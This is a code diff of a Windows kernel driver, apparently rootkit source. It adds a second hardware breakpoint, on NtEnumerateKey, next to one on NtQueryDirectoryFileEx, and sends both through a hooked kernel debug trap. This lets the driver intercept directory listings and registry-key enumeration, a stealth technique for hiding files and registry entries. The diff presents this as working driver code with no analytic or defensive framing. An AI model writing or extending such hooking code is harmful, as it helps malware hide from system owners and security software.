@@ -24,18 +24,25 @@ __declspec(noinline) void thread(PVOID param) {
 	}
 }
 
+funAddr_t funAddr;
+
 __declspec(noinline) void setDr(PVOID param) {
-	uint64_t dr0, dr7;
+	uint64_t dr0, dr1, dr7;
 	LARGE_INTEGER delay;
 	delay.QuadPart = -1;
+	dr7 = __readdr(7);
 
 	dr0 = (uint64_t)NtQueryDirectoryFileEx;
-	dr7 = __readdr(7);
 	dr7 |= 0x1 << 1;
 	dr7 &= ~(0xf << 16);
 
+	dr1 = funAddr.NtEnumerateKey;
+	dr7 |= 0x1 << 3;
+	dr7 &= ~(0xf << 20);
+
 	while (1) {
 		__writedr(0, dr0);
+		__writedr(1, dr1);
 		__writedr(7, dr7);
 		KeDelayExecutionThread(UserMode, TRUE, &delay);
 	}
@@ -65,6 +72,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	rand_init(&state);
 
+	//funAddr is set here
 	HookKdTrap(handler);
 
 	queryDirInst = hde64_disasm(NtQueryDirectoryFileEx, &hs);
